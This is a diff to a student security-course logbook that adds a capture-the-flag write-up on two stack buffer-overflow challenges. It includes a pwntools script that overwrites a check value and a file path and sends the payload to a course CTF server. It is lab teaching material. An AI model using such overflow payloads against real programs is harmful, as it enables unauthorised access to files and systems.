@@ -29,3 +29,40 @@ To get our new return address, we added our offset (108 + 4) to the address of t
 After running our exploit we ran the stack-L1 program and verified that the exploit had worked because the shell was invoked (see attached image).
 
 [Logbook 5 - Task 3 - Part 3](/screenshots/logbook5-task3-3.png)
+
+-----------------------------
+
+## CTF - Week 5
+
+### 1st Challenge
+
+First we analysed the program, and found that a 28 character long string was being written into a string variable with an allocated memory of only 20 characters. By inputting 20 random characters followed by "flag.txt", we were able to overwrite the contents of the meme_file variable and consequently access the contents of the flag.txt file.
+
+### 2nd Challenge
+
+The difference from the 1st challenge, was that in the second challenge, changing the value of meme_file variable wasn't enough. First we needed to overwrite a flag variable so that the content of the flag was 0xfefc2122, and only after that, could we overwrite the meme_file variable with the path to the flag file (flag.txt). In order to do this we wrote a python script that creates a 32 byte array (32 is the length scanned by the program), placed the flag after the 20 bytes used to fill the buffer and immediately after we placed the flag's path ("flag.txt").
+
+Here is the script we wrote:
+
+```python
+#!/usr/bin/python3
+from pwn import *
+import sys
+
+N=32
+content = bytearray(0x0 for i in range(N))
+number  = 0xfefc2122
+content[20:24]  =  (number).to_bytes(4,byteorder='little')
+content[24:32] = ("flag.txt").encode('latin-1')
+print(content)
+DEBUG = False
+
+if DEBUG:
+    r = process('./program')
+else:
+    r = remote('ctf-fsi.fe.up.pt', 4000)
+
+r.recvuntil(b":")
+r.sendline(content)
+r.interactive()
+```
